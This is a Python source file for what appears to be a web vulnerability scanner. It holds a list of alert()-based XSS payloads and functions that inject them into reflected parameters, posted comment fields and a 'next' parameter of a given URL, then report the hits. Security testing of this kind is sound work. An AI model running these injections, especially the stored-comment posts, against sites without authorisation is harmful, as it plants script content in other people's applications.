import requests
import urllib.parse
import re

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "\" onmouseover=\"alert('XSS')",
    "'><script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "'; alert(String.fromCharCode(88,83,83)) //",
    "<iframe src=javascript:alert('XSS')>",
    "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
    "document.write('<script>alert(\"XSS\")</script>');",
    "eval('alert(\"XSS\")');",
    "setTimeout('alert(\"XSS\")', 1000);",
    "location.href='javascript:alert(\"XSS\")';"
]

def detect_reflected_xss(url):
    """Tests for Reflected XSS by injecting payloads into detected parameters."""
    results = []
    try:
        response = requests.get(url, timeout=10)
        response_text = response.text.lower()
        input_names = re.findall(r'<input.*?name=["\'](.*?)["\']', response_text)
        if not input_names:
            input_names = ["query", "search", "input"]
    except requests.exceptions.RequestException:
        return [{"issue": "Error: Unable to retrieve form inputs. Using default test parameter.", "severity": "Low"}]

    found = False
    for payload in XSS_PAYLOADS:
        encoded_payload = urllib.parse.quote(payload)
        for param in input_names:
            test_url = f"{url}?{param}={encoded_payload}"
            try:
                response = requests.get(test_url, timeout=10)
                response_text = response.text.lower()
                if (payload.lower() in response_text or 
                    urllib.parse.unquote(payload).lower() in response_text or
                    payload.replace("<", "&lt;").replace(">", "&gt;") in response_text):
                    results.append({
                        "issue": f"Reflected XSS detected via `{param}` with payload: {payload}",
                        "severity": "High"
                    })
                    found = True
            except requests.exceptions.RequestException:
                continue

    if not found:
        results.append({
            "issue": "No reflected XSS detected.",
            "severity": "Low"
        })

    return results

def detect_stored_xss(url):
    """Tests for Stored XSS by submitting payloads and checking if they persist."""
    results = []
    found = False

    for payload in XSS_PAYLOADS:
        data = {"comment": payload}
        try:
            requests.post(url, data=data, timeout=10)
            response = requests.get(url, timeout=10)
            if payload.lower() in response.text.lower():
                results.append({
                    "issue": f"Stored XSS detected with payload: {payload}",
                    "severity": "High"
                })
                found = True
        except requests.exceptions.RequestException:
            continue

    if not found:
        results.append({
            "issue": "No stored XSS detected.",
            "severity": "Low"
        })

    return results

def detect_dom_xss(url):
    """Tests for DOM-Based XSS by injecting payloads and checking for dangerous JS sinks."""
    results = []
    found = False

    try:
        response = requests.get(url, timeout=10)
        response_text = response.text.lower()
        dom_sinks = ["document.write", "eval", "innerhtml", "settimeout", "setinterval", "location.href"]
        for sink in dom_sinks:
            if sink in response_text:
                results.append({
                    "issue": f"Potential DOM-Based XSS vulnerability: `{sink}` found in page source.",
                    "severity": "Medium"
                })
                found = True
    except requests.exceptions.RequestException:
        return [{"issue": "Error: Unable to analyze JavaScript sources.", "severity": "Low"}]

    for payload in XSS_PAYLOADS:
        encoded_payload = urllib.parse.quote(payload)
        test_url = f"{url}?next={encoded_payload}"
        try:
            response = requests.get(test_url, timeout=10)
            response_text = response.text.lower()
            if payload.lower() in response_text or urllib.parse.quote(payload).lower() in response_text:
                results.append({
                    "issue": f"DOM-Based XSS detected with payload: {payload}",
                    "severity": "High"
                })
                found = True
        except requests.exceptions.RequestException:
            continue

    if not found:
        results.append({
            "issue": "No DOM-Based XSS detected.",
            "severity": "Low"
        })

    return results
